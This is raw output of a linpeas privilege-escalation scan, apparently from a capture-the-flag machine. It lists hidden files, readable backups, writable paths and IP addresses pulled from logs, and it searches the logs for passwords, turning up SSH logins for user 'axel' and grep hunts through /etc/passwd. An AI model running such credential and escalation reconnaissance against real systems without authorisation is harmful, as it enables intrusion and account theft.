    97414      4 -rw-r--r--   1 root     root          455 Dec  5 11:35 /usr/src/linux-headers-5.4.0-204-generic/tools/objtool/arch/x86/.objtool-in.o.cmd
    97405     12 -rw-r--r--   1 root     root         8607 Dec  5 11:35 /usr/src/linux-headers-5.4.0-204-generic/tools/objtool/.orc_gen.o.cmd
    97395      4 -rw-r--r--   1 root     root          426 Dec  5 11:35 /usr/src/linux-headers-5.4.0-204-generic/tools/objtool/.fixdep-in.o.cmd
    97399      4 -rw-r--r--   1 root     root         3726 Dec  5 11:35 /usr/src/linux-headers-5.4.0-204-generic/tools/objtool/.libctype.o.cmd
    97398      8 -rw-r--r--   1 root     root         7882 Dec  5 11:35 /usr/src/linux-headers-5.4.0-204-generic/tools/objtool/.help.o.cmd
    97397      8 -rw-r--r--   1 root     root         4406 Dec  5 11:35 /usr/src/linux-headers-5.4.0-204-generic/tools/objtool/.fixdep.o.d
    97390      8 -rw-r--r--   1 root     root         7781 Dec  5 11:35 /usr/src/linux-headers-5.4.0-204-generic/tools/objtool/.builtin-check.o.cmd
    97411      8 -rw-r--r--   1 root     root         4527 Dec  5 11:35 /usr/src/linux-headers-5.4.0-204-generic/tools/objtool/.str_error_r.o.cmd
    97396      8 -rw-r--r--   1 root     root         5282 Dec  5 11:35 /usr/src/linux-headers-5.4.0-204-generic/tools/objtool/.fixdep.o.cmd
    97401      4 -rw-r--r--   1 root     root         1256 Dec  5 11:35 /usr/src/linux-headers-5.4.0-204-generic/tools/objtool/.libsubcmd-in.o.cmd
    97402      4 -rw-r--r--   1 root     root         1938 Dec  5 11:35 /usr/src/linux-headers-5.4.0-204-generic/tools/objtool/.objtool-in.o.cmd
    97317      8 -rw-r--r--   1 root     root         6749 Dec  5 11:35 /usr/src/linux-headers-5.4.0-204-generic/scripts/.extract-cert.cmd
    97320      8 -rw-r--r--   1 root     root         4941 Dec  5 11:35 /usr/src/linux-headers-5.4.0-204-generic/scripts/.recordmcount.cmd
    97321      8 -rw-r--r--   1 root     root         8168 Dec  5 11:35 /usr/src/linux-headers-5.4.0-204-generic/scripts/.sign-file.cmd
    97316      4 -rw-r--r--   1 root     root         3686 Dec  5 11:35 /usr/src/linux-headers-5.4.0-204-generic/scripts/.conmakehash.cmd
    97324      8 -rw-r--r--   1 root     root         4409 Dec  5 11:35 /usr/src/linux-headers-5.4.0-204-generic/scripts/basic/.fixdep.cmd
    97371      8 -rw-r--r--   1 root     root         6952 Dec  5 11:35 /usr/src/linux-headers-5.4.0-204-generic/scripts/mod/.modpost.o.cmd
    97365      8 -rw-r--r--   1 root     root         6884 Dec  5 11:35 /usr/src/linux-headers-5.4.0-204-generic/scripts/mod/.devicetable-offsets.s.cmd
    97366      4 -rw-r--r--   1 root     root          104 Dec  5 11:35 /usr/src/linux-headers-5.4.0-204-generic/scripts/mod/.elfconfig.h.cmd
    97368      8 -rw-r--r--   1 root     root         5084 Dec  5 11:35 /usr/src/linux-headers-5.4.0-204-generic/scripts/mod/.file2alias.o.cmd
    97372      8 -rw-r--r--   1 root     root         6428 Dec  5 11:35 /usr/src/linux-headers-5.4.0-204-generic/scripts/mod/.sumversion.o.cmd
    97369      4 -rw-r--r--   1 root     root         3889 Dec  5 11:35 /usr/src/linux-headers-5.4.0-204-generic/scripts/mod/.mk_elfconfig.cmd
    97367      4 -rw-r--r--   1 root     root         3430 Dec  5 11:35 /usr/src/linux-headers-5.4.0-204-generic/scripts/mod/.empty.o.cmd
    97370      4 -rw-r--r--   1 root     root          131 Dec  5 11:35 /usr/src/linux-headers-5.4.0-204-generic/scripts/mod/.modpost.cmd
    97332      8 -rw-r--r--   1 root     root         4770 Dec  5 11:35 /usr/src/linux-headers-5.4.0-204-generic/scripts/genksyms/.lex.lex.o.cmd
    97334      4 -rw-r--r--   1 root     root         3756 Dec  5 11:35 /usr/src/linux-headers-5.4.0-204-generic/scripts/genksyms/.parse.tab.o.cmd
    97333      4 -rw-r--r--   1 root     root          216 Dec  5 11:35 /usr/src/linux-headers-5.4.0-204-generic/scripts/genksyms/.parse.tab.c.cmd
    97331      4 -rw-r--r--   1 root     root          126 Dec  5 11:35 /usr/src/linux-headers-5.4.0-204-generic/scripts/genksyms/.lex.lex.c.cmd
    97329      4 -rw-r--r--   1 root     root          155 Dec  5 11:35 /usr/src/linux-headers-5.4.0-204-generic/scripts/genksyms/.genksyms.cmd
    97330      8 -rw-r--r--   1 root     root         4225 Dec  5 11:35 /usr/src/linux-headers-5.4.0-204-generic/scripts/genksyms/.genksyms.o.cmd
    97383      8 -rw-r--r--   1 root     root         5973 Dec  5 11:35 /usr/src/linux-headers-5.4.0-204-generic/scripts/selinux/genheaders/.genheaders.cmd
    97385      8 -rw-r--r--   1 root     root         6805 Dec  5 11:35 /usr/src/linux-headers-5.4.0-204-generic/scripts/selinux/mdp/.mdp.cmd
    97318      8 -rw-r--r--   1 root     root         6628 Dec  5 11:35 /usr/src/linux-headers-5.4.0-204-generic/scripts/.insert-sys-cert.cmd
    97347      8 -rw-r--r--   1 root     root         4233 Dec  5 11:35 /usr/src/linux-headers-5.4.0-204-generic/scripts/kconfig/.expr.o.cmd
    97349      8 -rw-r--r--   1 root     root         4987 Dec  5 11:35 /usr/src/linux-headers-5.4.0-204-generic/scripts/kconfig/.lexer.lex.o.cmd
    97351      8 -rw-r--r--   1 root     root         4227 Dec  5 11:35 /usr/src/linux-headers-5.4.0-204-generic/scripts/kconfig/.parser.tab.o.cmd
    97352      4 -rw-r--r--   1 root     root         4065 Dec  5 11:35 /usr/src/linux-headers-5.4.0-204-generic/scripts/kconfig/.preprocess.o.cmd
    97348      4 -rw-r--r--   1 root     root          129 Dec  5 11:35 /usr/src/linux-headers-5.4.0-204-generic/scripts/kconfig/.lexer.lex.c.cmd
    97344      4 -rw-r--r--   1 root     root          245 Dec  5 11:35 /usr/src/linux-headers-5.4.0-204-generic/scripts/kconfig/.conf.cmd
    97353      8 -rw-r--r--   1 root     root         4147 Dec  5 11:35 /usr/src/linux-headers-5.4.0-204-generic/scripts/kconfig/.symbol.o.cmd
    97350      4 -rw-r--r--   1 root     root          176 Dec  5 11:35 /usr/src/linux-headers-5.4.0-204-generic/scripts/kconfig/.parser.tab.h.cmd
    97346      8 -rw-r--r--   1 root     root         5738 Dec  5 11:35 /usr/src/linux-headers-5.4.0-204-generic/scripts/kconfig/.confdata.o.cmd
    97345      8 -rw-r--r--   1 root     root         5349 Dec  5 11:35 /usr/src/linux-headers-5.4.0-204-generic/scripts/kconfig/.conf.o.cmd
    97319      4 -rw-r--r--   1 root     root         3950 Dec  5 11:35 /usr/src/linux-headers-5.4.0-204-generic/scripts/.kallsyms.cmd
    97322      8 -rw-r--r--   1 root     root         5242 Dec  5 11:35 /usr/src/linux-headers-5.4.0-204-generic/scripts/.sortextable.cmd
    97315      4 -rw-r--r--   1 root     root         1655 Dec  5 11:35 /usr/src/linux-headers-5.4.0-204-generic/scripts/.bin2c.cmd
    97314      8 -rw-r--r--   1 root     root         4732 Dec  5 11:35 /usr/src/linux-headers-5.4.0-204-generic/scripts/.asn1_compiler.cmd
      680      0 -rw-r--r--   1 root     root            0 Feb  3 08:13 /run/network/.ifstate.lock
    35867      0 -rw-r--r--   1 landscape landscape        0 Mar 14  2023 /var/lib/landscape/.cleanup.user
   132239      4 -rw-r--r--   1 root      root           102 Feb 13  2020 /etc/cron.monthly/.placeholder
   132449      4 -rw-r--r--   1 root      root           220 Feb 25  2020 /etc/skel/.bash_logout
   173401      0 -rw-r--r--   1 root      root             0 Mar 31  2022 /etc/sensors.d/.placeholder
   173213      0 -rw-r--r--   1 root      root             0 Jun  5  2024 /etc/.java/.systemPrefs/.system.lock
   173217      0 -rw-r--r--   1 root      root             0 Jun  5  2024 /etc/.java/.systemPrefs/.systemRootModFile
   131752      0 -rw-------   1 root      root             0 Mar 14  2023 /etc/.pwd.lock
   132240      4 -rw-r--r--   1 root      root           102 Feb 13  2020 /etc/cron.weekly/.placeholder
   132226      4 -rw-r--r--   1 root      root           102 Feb 13  2020 /etc/cron.d/.placeholder
   132238      4 -rw-r--r--   1 root      root           102 Feb 13  2020 /etc/cron.hourly/.placeholder
   132229      4 -rw-r--r--   1 root      root           102 Feb 13  2020 /etc/cron.daily/.placeholder
   136289      4 -rw-r--r--   1 rosa      rosa           220 Aug  7  2024 /home/rosa/.bash_logout

[+] Readable files inside /tmp, /var/tmp, /var/backups(limit 100)
-rw-r--r-- 1 root root 44272 Jan 27 15:58 /var/backups/apt.extended_states.0                                        
-rw-r--r-- 1 root root 3557 Sep  1 06:25 /var/backups/alternatives.tar.1.gz
-rw-r--r-- 1 root root 186 Aug 30 04:09 /var/backups/dpkg.statoverride.1.gz
-rw-r--r-- 1 root root 816262 Sep  4 01:53 /var/backups/dpkg.status.0
-rw-r--r-- 1 root root 5320 Aug  7 05:01 /var/backups/apt.extended_states.6.gz
-rw-r--r-- 1 root root 5028 Dec 31 12:24 /var/backups/apt.extended_states.2.gz
-rw-r--r-- 1 root root 5369 Aug 30 04:09 /var/backups/apt.extended_states.5.gz
-rw-r--r-- 1 root root 71680 Sep 26 06:25 /var/backups/alternatives.tar.0
-rw-r--r-- 1 root smmsp 64161 Aug 30 04:09 /var/backups/sendmail.cf.bak
-rw-r--r-- 1 root root 5045 Sep  4 01:53 /var/backups/apt.extended_states.3.gz
-rw-r--r-- 1 root root 139 Jun  3  2024 /var/backups/dpkg.diversions.1.gz
-rw-r--r-- 1 root smmsp 2375 Aug 30 04:09 /var/backups/submit.mc.bak
-rw-r--r-- 1 root smmsp 44601 Aug 30 04:09 /var/backups/submit.cf.bak
-rw-r--r-- 1 root smmsp 4058 Aug 30 04:09 /var/backups/sendmail.mc.bak
-rw-r--r-- 1 root root 255 Aug 30 04:09 /var/backups/dpkg.statoverride.0
-rw-r--r-- 1 root root 268 Jun  3  2024 /var/backups/dpkg.diversions.0
-rw-r--r-- 1 root root 212508 Aug 31 18:31 /var/backups/dpkg.status.1.gz
-rw-r--r-- 1 root root 4837 Dec 31 12:31 /var/backups/apt.extended_states.1.gz
-rw-r--r-- 1 root root 5372 Sep  1 17:04 /var/backups/apt.extended_states.4.gz

[+] Interesting writable Files
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files                                      
/dev/mqueue                                                                                                         
/dev/mqueue/linpeas.txt
/dev/shm
/run/lock
/run/screen
/run/sendmail/mta/smsocket
/run/user/1001
/run/user/1001/gnupg
/run/user/1001/inaccessible
/run/user/1001/systemd
/run/user/1001/systemd/units
/sys/kernel/security/apparmor/.access
/sys/kernel/security/apparmor/attr/current
/sys/kernel/security/apparmor/attr/exec
/sys/kernel/security/apparmor/.load
/sys/kernel/security/apparmor/.remove
/sys/kernel/security/apparmor/.replace
/tmp
/tmp/.font-unix
/tmp/.ICE-unix
/tmp/.Test-unix
/tmp/.X11-unix
/tmp/.XIM-unix
/var/crash
/var/lib/php/sessions
/var/mail
/var/tmp
/dev/mqueue/linpeas.txt

[+] Searching passwords in config PHP files
                                                                                                                    
[+] Finding IPs inside logs
   6902 /var/log/apache2/access.log:10.10.16.13                                                                     
   1065 /var/log/apache2/access.log.1:127.0.0.1
   2429 /var/log/apache2/access.log:127.0.0.1
   3558 /var/log/apache2/error.log:10.10.16.13
     26 /var/log/audit/audit.log:10.10.16.13
     18 /var/log/audit/audit.log.1:10.10.14.69
     24 /var/log/audit/audit.log.1:10.10.16.13
     51 /var/log/audit/audit.log.2:10.10.14.66
      4 /var/log/audit/audit.log.2:10.10.14.69
      3 /var/log/audit/audit.log.2:1.24.11.0
      1 /var/log/audit/audit.log.2:1.3.4.0
      3 /var/log/audit/audit.log.2:3.2.5.1
      3 /var/log/audit/audit.log.2:7.13.11.0
      1 /var/log/audit/audit.log.2:8.37.7.0
      9 /var/log/audit/audit.log.3:1.24.11.0
      3 /var/log/audit/audit.log.3:1.3.4.0
      6 /var/log/audit/audit.log.3:3.2.5.1
      6 /var/log/audit/audit.log.3:7.13.11.0
      2 /var/log/audit/audit.log.3:8.37.7.0
      7 /var/log/auth.log:0.0.0.0
      8 /var/log/auth.log.1:0.0.0.0
      3 /var/log/auth.log:10.10.14.66
      1 /var/log/auth.log:10.10.14.69
      7 /var/log/auth.log:10.10.16.13
     18 /var/log/auth.log.1:10.10.14.66
      3 /var/log/auth.log.1:10.10.14.69
      4 /var/log/auth.log:127.0.0.1
      5 /var/log/bootstrap.log:020.02.11.2
      5 /var/log/bootstrap.log:0.5.10.2
      2 /var/log/bootstrap.log:0.99.7.1
      9 /var/log/bootstrap.log:1.3.4.202
    229 /var/log/cloud-init-output.log:0.0.0.0
      1 /var/log/cloud-init-output.log:10.0.2.0
      1 /var/log/cloud-init-output.log:10.0.2.15
      2 /var/log/cloud-init-output.log:10.0.2.2
      2 /var/log/cloud-init-output.log:10.129.0.0
      2 /var/log/cloud-init-output.log:10.129.0.1
      2 /var/log/cloud-init-output.log:10.129.231.204
     72 /var/log/cloud-init-output.log:127.0.0.1
     69 /var/log/cloud-init-output.log:192.168.1.0
     81 /var/log/cloud-init-output.log:192.168.1.254
      1 /var/log/cloud-init-output.log:192.168.1.64
      7 /var/log/cloud-init-output.log:192.168.1.65
      6 /var/log/cloud-init-output.log:192.168.1.72
      2 /var/log/cloud-init-output.log:192.168.1.73
     14 /var/log/cloud-init-output.log:192.168.1.76
     39 /var/log/cloud-init-output.log:192.168.1.77
     72 /var/log/cloud-init-output.log:255.0.0.0
      4 /var/log/cloud-init-output.log:255.255.0.0
    140 /var/log/cloud-init-output.log:255.255.255.0
     13 /var/log/cloud-init-output.log:255.255.255.255
     60 /var/log/dpkg.log.1:0.20.04.1
      4 /var/log/dpkg.log.1:0.20.04.13
      6 /var/log/dpkg.log.1:0.20.04.14
      4 /var/log/dpkg.log.1:0.20.04.2
      8 /var/log/dpkg.log.1:0.20.04.3
     12 /var/log/dpkg.log.1:0.20.04.5
      8 /var/log/dpkg.log.1:0.99.9.11
     12 /var/log/dpkg.log.1:0.99.9.12
      6 /var/log/dpkg.log.1:1.20.04.1
      8 /var/log/dpkg.log.1:20.04.10.11
     12 /var/log/dpkg.log.1:20.04.10.23
      4 /var/log/dpkg.log.1:3.192.30.16
      6 /var/log/dpkg.log.1:3.192.30.19
     12 /var/log/dpkg.log.1:5.4.0.193
     18 /var/log/dpkg.log.1:5.4.0.204
      6 /var/log/installer/installer-journal.txt:0.0.0.0
     23 /var/log/installer/installer-journal.txt:0.20.04.1
      8 /var/log/installer/installer-journal.txt:0.20.04.2
      7 /var/log/installer/installer-journal.txt:0.20.04.3
      3 /var/log/installer/installer-journal.txt:0.20.04.4
      1 /var/log/installer/installer-journal.txt:0.20.04.5
      3 /var/log/installer/installer-journal.txt:0.20.04.7
      1 /var/log/installer/installer-journal.txt:10.0.2.0
      4 /var/log/installer/installer-journal.txt:10.0.2.15
      5 /var/log/installer/installer-journal.txt:10.0.2.2
      1 /var/log/installer/installer-journal.txt:127.0.0.1
      1 /var/log/installer/installer-journal.txt:185.125.190.57
      1 /var/log/installer/installer-journal.txt:255.0.0.0
      2 /var/log/installer/installer-journal.txt:255.255.255.0
      1 /var/log/installer/installer-journal.txt:255.255.255.255
      2 /var/log/installer/installer-journal.txt:5.20.04.4
      6 /var/log/installer/installer-journal.txt:5.20.04.5
     12 /var/log/installer/installer-journal.txt:5.4.0.182
     10 /var/log/installer/subiquity-server-debug.log:10.0.2.0
     15 /var/log/installer/subiquity-server-debug.log:10.0.2.15
      5 /var/log/installer/subiquity-server-debug.log:10.0.2.2
      5 /var/log/installer/subiquity-server-debug.log:10.0.2.255
      2 /var/log/installer/subiquity-server-debug.log:127.0.0.0
      3 /var/log/installer/subiquity-server-debug.log:127.0.0.1
      1 /var/log/installer/subiquity-server-debug.log:127.255.255.255
     10 /var/log/installer/subiquity-server-debug.log.2098:10.0.2.0
     15 /var/log/installer/subiquity-server-debug.log.2098:10.0.2.15
      5 /var/log/installer/subiquity-server-debug.log.2098:10.0.2.2
      5 /var/log/installer/subiquity-server-debug.log.2098:10.0.2.255
      2 /var/log/installer/subiquity-server-debug.log.2098:127.0.0.0
      3 /var/log/installer/subiquity-server-debug.log.2098:127.0.0.1
      1 /var/log/installer/subiquity-server-debug.log.2098:127.255.255.255
      8 /var/log/kern.log.1:1.4.17.0
      6 /var/log/kern.log:1.4.17.0
      1 /var/log/lastlog:10.10.14.69
      1 /var/log/lastlog:10.10.16.13
      3 /var/log/mail.log:10.10.11.53
      1 /var/log/mail.log:10.129.231.204
      1 /var/log/mail.log:10.129.71.234
      8 /var/log/mail.log.1:10.10.11.53
     12 /var/log/mail.log.1:127.0.0.1
    111 /var/log/mail.log:127.0.0.1
      8 /var/log/syslog:10.129.0.1
     15 /var/log/syslog:10.129.71.234
      3 /var/log/syslog.1:10.10.10.2
      3 /var/log/syslog.1:10.10.11.53
      8 /var/log/syslog.1:10.129.0.1
      4 /var/log/syslog.1:10.129.231.204
      8 /var/log/syslog.1:10.129.231.253
     63 /var/log/syslog:1.1.1.1
     59 /var/log/syslog.1:127.0.0.1
      2 /var/log/syslog.1:127.0.1.1
      2 /var/log/syslog.1:1.4.17.0
     40 /var/log/syslog.1:255.255.255.255
     54 /var/log/syslog:127.0.0.1
      1 /var/log/syslog:127.0.1.1
     50 /var/log/syslog.1:8.8.8.8
      2 /var/log/syslog:255.255.255.255
     72 /var/log/syslog:8.8.8.8
     14 /var/log/wtmp:10.10.14.66
      3 /var/log/wtmp:10.10.14.69
      3 /var/log/wtmp:10.10.16.13
     68 /var/log/wtmp:192.168.1.64
     19 /var/log/wtmp:192.168.1.67
      4 /var/log/wtmp:192.168.1.75

[+] Finding passwords inside logs (limited 100)
Binary file /var/log/journal/57e7eb2a83ed4e11a0f3602ef7e94d62/system.journal matches                                
/var/log/audit/audit.log.1:type=CONFIG_CHANGE msg=audit(1738326406.943:83): auid=4294967295 ses=4294967295 op=add_rule key="etcpasswd" list=4 res=1
/var/log/audit/audit.log.1:type=CONFIG_CHANGE msg=audit(1738326406.943:85): auid=4294967295 ses=4294967295 op=add_rule key="etcpasswd" list=4 res=1
/var/log/audit/audit.log.1:type=CONFIG_CHANGE msg=audit(1738326406.943:86): auid=4294967295 ses=4294967295 op=add_rule key="opasswd" list=4 res=1
/var/log/audit/audit.log.1:type=CONFIG_CHANGE msg=audit(1738570390.102:80): auid=4294967295 ses=4294967295 op=add_rule key="etcpasswd" list=4 res=1
/var/log/audit/audit.log.1:type=CONFIG_CHANGE msg=audit(1738570390.102:82): auid=4294967295 ses=4294967295 op=add_rule key="etcpasswd" list=4 res=1
/var/log/audit/audit.log.1:type=CONFIG_CHANGE msg=audit(1738570390.106:83): auid=4294967295 ses=4294967295 op=add_rule key="opasswd" list=4 res=1
/var/log/audit/audit.log.1:type=EXECVE msg=audit(1738323229.850:1911): argc=2 a0="/bin/systemd-tty-ask-password-agent" a1="--watch"
/var/log/audit/audit.log.2:type=CONFIG_CHANGE msg=audit(1738251187.250:83): auid=4294967295 ses=4294967295 op=add_rule key="etcpasswd" list=4 res=1
/var/log/audit/audit.log.2:type=CONFIG_CHANGE msg=audit(1738251187.250:85): auid=4294967295 ses=4294967295 op=add_rule key="etcpasswd" list=4 res=1
/var/log/audit/audit.log.2:type=CONFIG_CHANGE msg=audit(1738251187.254:86): auid=4294967295 ses=4294967295 op=add_rule key="opasswd" list=4 res=1
/var/log/audit/audit.log.2:type=CONFIG_CHANGE msg=audit(1738251264.385:86): auid=4294967295 ses=4294967295 op=add_rule key="etcpasswd" list=4 res=1
/var/log/audit/audit.log.2:type=CONFIG_CHANGE msg=audit(1738251264.385:88): auid=4294967295 ses=4294967295 op=add_rule key="etcpasswd" list=4 res=1
/var/log/audit/audit.log.2:type=CONFIG_CHANGE msg=audit(1738251264.385:89): auid=4294967295 ses=4294967295 op=add_rule key="opasswd" list=4 res=1
/var/log/audit/audit.log.2:type=CONFIG_CHANGE msg=audit(1738251389.379:94): auid=4294967295 ses=4294967295 op=add_rule key="etcpasswd" list=4 res=1
/var/log/audit/audit.log.2:type=CONFIG_CHANGE msg=audit(1738251389.379:96): auid=4294967295 ses=4294967295 op=add_rule key="etcpasswd" list=4 res=1
/var/log/audit/audit.log.2:type=CONFIG_CHANGE msg=audit(1738251389.379:97): auid=4294967295 ses=4294967295 op=add_rule key="opasswd" list=4 res=1
/var/log/audit/audit.log.2:type=CONFIG_CHANGE msg=audit(1738251578.477:94): auid=4294967295 ses=4294967295 op=add_rule key="etcpasswd" list=4 res=1
/var/log/audit/audit.log.2:type=CONFIG_CHANGE msg=audit(1738251578.477:96): auid=4294967295 ses=4294967295 op=add_rule key="etcpasswd" list=4 res=1
/var/log/audit/audit.log.2:type=CONFIG_CHANGE msg=audit(1738251578.481:97): auid=4294967295 ses=4294967295 op=add_rule key="opasswd" list=4 res=1
/var/log/audit/audit.log.2:type=CONFIG_CHANGE msg=audit(1738322234.502:94): auid=4294967295 ses=4294967295 op=add_rule key="etcpasswd" list=4 res=1
/var/log/audit/audit.log.2:type=CONFIG_CHANGE msg=audit(1738322234.502:96): auid=4294967295 ses=4294967295 op=add_rule key="etcpasswd" list=4 res=1
/var/log/audit/audit.log.2:type=CONFIG_CHANGE msg=audit(1738322234.502:97): auid=4294967295 ses=4294967295 op=add_rule key="opasswd" list=4 res=1
/var/log/audit/audit.log:type=EXECVE msg=audit(1738574156.908:5692): argc=2 a0="grep" a1="/chpasswd$"
/var/log/audit/audit.log:type=EXECVE msg=audit(1738574156.956:5708): argc=2 a0="grep" a1="/passwd$"
/var/log/audit/audit.log:type=EXECVE msg=audit(1738574157.044:5736): argc=2 a0="grep" a1="/chpasswd$"
/var/log/audit/audit.log:type=EXECVE msg=audit(1738574157.100:5752): argc=2 a0="grep" a1="/passwd$"
/var/log/audit/audit.log:type=EXECVE msg=audit(1738574157.212:5780): argc=2 a0="grep" a1="/chpasswd$"
/var/log/audit/audit.log:type=EXECVE msg=audit(1738574157.264:5796): argc=2 a0="grep" a1="/passwd$"
/var/log/audit/audit.log:type=EXECVE msg=audit(1738574157.352:5824): argc=2 a0="grep" a1="/chpasswd$"
/var/log/audit/audit.log:type=EXECVE msg=audit(1738574157.396:5840): argc=2 a0="grep" a1="/passwd$"
/var/log/audit/audit.log:type=EXECVE msg=audit(1738574157.484:5868): argc=2 a0="grep" a1="/chpasswd$"
/var/log/audit/audit.log:type=EXECVE msg=audit(1738574157.528:5884): argc=2 a0="grep" a1="/passwd$"
/var/log/audit/audit.log:type=EXECVE msg=audit(1738574157.612:5912): argc=2 a0="grep" a1="/chpasswd$"
/var/log/audit/audit.log:type=EXECVE msg=audit(1738574157.656:5928): argc=2 a0="grep" a1="/passwd$"
/var/log/audit/audit.log:type=EXECVE msg=audit(1738574157.764:5956): argc=2 a0="grep" a1="/chpasswd$"
/var/log/audit/audit.log:type=EXECVE msg=audit(1738574157.872:5979): argc=2 a0="grep" a1="/chpasswd$"
/var/log/audit/audit.log:type=EXECVE msg=audit(1738574157.920:5995): argc=2 a0="grep" a1="/passwd$"
/var/log/audit/audit.log:type=EXECVE msg=audit(1738574158.024:6023): argc=2 a0="grep" a1="/chpasswd$"
/var/log/audit/audit.log:type=EXECVE msg=audit(1738574158.084:6039): argc=2 a0="grep" a1="/passwd$"
/var/log/audit/audit.log:type=EXECVE msg=audit(1738574158.220:6067): argc=2 a0="grep" a1="/chpasswd$"
/var/log/audit/audit.log:type=EXECVE msg=audit(1738574158.296:6086): argc=2 a0="grep" a1="/passwd$"
/var/log/audit/audit.log:type=EXECVE msg=audit(1738574158.380:6108): argc=2 a0="grep" a1="/chpasswd$"
/var/log/audit/audit.log:type=EXECVE msg=audit(1738574158.476:6124): argc=2 a0="grep" a1="/passwd$"
/var/log/audit/audit.log:type=EXECVE msg=audit(1738574158.600:6152): argc=2 a0="grep" a1="/chpasswd$"
/var/log/audit/audit.log:type=EXECVE msg=audit(1738574158.660:6169): argc=2 a0="grep" a1="/chpasswd$"
/var/log/audit/audit.log:type=EXECVE msg=audit(1738574158.696:6185): argc=2 a0="grep" a1="/passwd$"
/var/log/audit/audit.log:type=EXECVE msg=audit(1738574158.792:6213): argc=2 a0="grep" a1="/chpasswd$"
/var/log/audit/audit.log:type=EXECVE msg=audit(1738574158.852:6229): argc=2 a0="grep" a1="/passwd$"
/var/log/audit/audit.log:type=EXECVE msg=audit(1738574158.876:6235): argc=2 a0="grep" a1="/chpasswd$"
/var/log/audit/audit.log:type=EXECVE msg=audit(1738574158.932:6251): argc=2 a0="grep" a1="/passwd$"
/var/log/audit/audit.log:type=EXECVE msg=audit(1738574158.960:6258): argc=2 a0="grep" a1="/chpasswd$"
/var/log/audit/audit.log:type=EXECVE msg=audit(1738574159.016:6274): argc=2 a0="grep" a1="/passwd$"
/var/log/audit/audit.log:type=EXECVE msg=audit(1738574159.064:6292): argc=2 a0="grep" a1="/chpasswd$"
/var/log/audit/audit.log:type=EXECVE msg=audit(1738574159.116:6308): argc=2 a0="grep" a1="/passwd$"
/var/log/audit/audit.log:type=EXECVE msg=audit(1738574160.060:6397): argc=2 a0="grep" a1="/chpasswd$"
/var/log/audit/audit.log:type=EXECVE msg=audit(1738574160.092:6413): argc=2 a0="grep" a1="/passwd$"
/var/log/audit/audit.log:type=EXECVE msg=audit(1738574160.136:6430): argc=2 a0="grep" a1="/chpasswd$"
/var/log/audit/audit.log:type=EXECVE msg=audit(1738574160.184:6446): argc=2 a0="grep" a1="/passwd$"
/var/log/audit/audit.log:type=EXECVE msg=audit(1738574160.260:6474): argc=2 a0="grep" a1="/chpasswd$"
/var/log/audit/audit.log:type=EXECVE msg=audit(1738574160.296:6490): argc=2 a0="grep" a1="/passwd$"
/var/log/audit/audit.log:type=EXECVE msg=audit(1738574160.364:6518): argc=2 a0="grep" a1="/chpasswd$"
/var/log/audit/audit.log:type=EXECVE msg=audit(1738574160.400:6534): argc=2 a0="grep" a1="/passwd$"
/var/log/audit/audit.log:type=EXECVE msg=audit(1738574160.472:6562): argc=2 a0="grep" a1="/chpasswd$"
/var/log/audit/audit.log:type=EXECVE msg=audit(1738574160.504:6578): argc=2 a0="grep" a1="/passwd$"
/var/log/audit/audit.log:type=EXECVE msg=audit(1738574160.568:6606): argc=2 a0="grep" a1="/chpasswd$"
/var/log/audit/audit.log:type=EXECVE msg=audit(1738574160.608:6622): argc=2 a0="grep" a1="/passwd$"
/var/log/audit/audit.log:type=EXECVE msg=audit(1738574160.672:6650): argc=2 a0="grep" a1="/chpasswd$"
/var/log/audit/audit.log:type=EXECVE msg=audit(1738574160.708:6666): argc=2 a0="grep" a1="/passwd$"
/var/log/audit/audit.log:type=EXECVE msg=audit(1738574160.776:6694): argc=2 a0="grep" a1="/chpasswd$"
/var/log/audit/audit.log:type=EXECVE msg=audit(1738574160.816:6710): argc=2 a0="grep" a1="/passwd$"
/var/log/audit/audit.log:type=EXECVE msg=audit(1738574160.916:6738): argc=2 a0="grep" a1="/chpasswd$"
/var/log/audit/audit.log:type=EXECVE msg=audit(1738574160.972:6754): argc=2 a0="grep" a1="/passwd$"
/var/log/audit/audit.log:type=EXECVE msg=audit(1738574161.088:6782): argc=2 a0="grep" a1="/chpasswd$"
/var/log/audit/audit.log:type=EXECVE msg=audit(1738574161.140:6798): argc=2 a0="grep" a1="/passwd$"
/var/log/audit/audit.log:type=EXECVE msg=audit(1738574161.256:6826): argc=2 a0="grep" a1="/chpasswd$"
/var/log/audit/audit.log:type=EXECVE msg=audit(1738574161.328:6842): argc=2 a0="grep" a1="/passwd$"
/var/log/audit/audit.log:type=EXECVE msg=audit(1738574161.432:6870): argc=2 a0="grep" a1="/chpasswd$"
/var/log/audit/audit.log:type=EXECVE msg=audit(1738574161.488:6886): argc=2 a0="grep" a1="/passwd$"
/var/log/audit/audit.log:type=EXECVE msg=audit(1738574161.620:6914): argc=2 a0="grep" a1="/chpasswd$"
/var/log/audit/audit.log:type=EXECVE msg=audit(1738574161.688:6930): argc=2 a0="grep" a1="/passwd$"
/var/log/audit/audit.log:type=EXECVE msg=audit(1738574161.828:6958): argc=2 a0="grep" a1="/chpasswd$"
/var/log/audit/audit.log:type=EXECVE msg=audit(1738574161.900:6974): argc=2 a0="grep" a1="/passwd$"
/var/log/audit/audit.log:type=EXECVE msg=audit(1738574162.032:7002): argc=2 a0="grep" a1="/chpasswd$"
/var/log/audit/audit.log:type=EXECVE msg=audit(1738574162.096:7018): argc=2 a0="grep" a1="/passwd$"
/var/log/audit/audit.log:type=EXECVE msg=audit(1738574162.212:7046): argc=2 a0="grep" a1="/chpasswd$"
/var/log/audit/audit.log:type=EXECVE msg=audit(1738574162.264:7062): argc=2 a0="grep" a1="/passwd$"
/var/log/audit/audit.log:type=EXECVE msg=audit(1738574162.392:7090): argc=2 a0="grep" a1="/chpasswd$"
/var/log/audit/audit.log:type=EXECVE msg=audit(1738574162.448:7106): argc=2 a0="grep" a1="/passwd$"
/var/log/audit/audit.log:type=EXECVE msg=audit(1738574164.168:7201): argc=4 a0="grep" a1="-v" a2="^[^:]*:[x\*]" a3="/etc/passwd"
/var/log/audit/audit.log:type=EXECVE msg=audit(1738574174.536:7837): argc=5 a0="grep" a1="-R" a2="-i" a3="pwd\|passw" a4="/var/log/"
/var/log/auth.log.1:Jan 21 12:35:29 cat sshd[1390]: Accepted password for axel from 10.10.14.66 port 52640 ssh2
/var/log/auth.log.1:Jan 21 12:38:17 cat sshd[14880]: Accepted password for axel from 10.10.14.66 port 46176 ssh2
/var/log/auth.log.1:Jan 21 12:39:49 cat sshd[1238]: Accepted password for axel from 10.10.14.66 port 60574 ssh2
/var/log/auth.log.1:Jan 21 12:39:50 cat sshd[1160]: Accepted password for axel from 10.10.14.66 port 60564 ssh2
